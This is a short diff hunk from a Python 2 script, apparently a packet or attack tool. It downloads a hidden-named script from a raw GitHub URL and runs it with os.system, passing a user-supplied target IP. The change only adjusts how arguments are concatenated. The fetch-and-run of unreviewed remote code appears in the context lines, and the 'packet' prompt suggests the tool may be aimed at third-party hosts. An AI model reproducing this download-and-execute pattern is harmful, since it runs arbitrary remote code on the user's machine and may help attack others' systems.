@@ -50,7 +50,7 @@ elif hama == '1':
         packet = raw_input("packet:")
 	down = "https://raw.githubusercontent.com/hh119191955/299292827uee/main/.dddd92.py"
 	wget.download(down)
-	os.system("python2 .dddd92.py" + ip + port + packet)
+	os.system('python2 .dddd92.py ' + ip)
 	
 	
 	
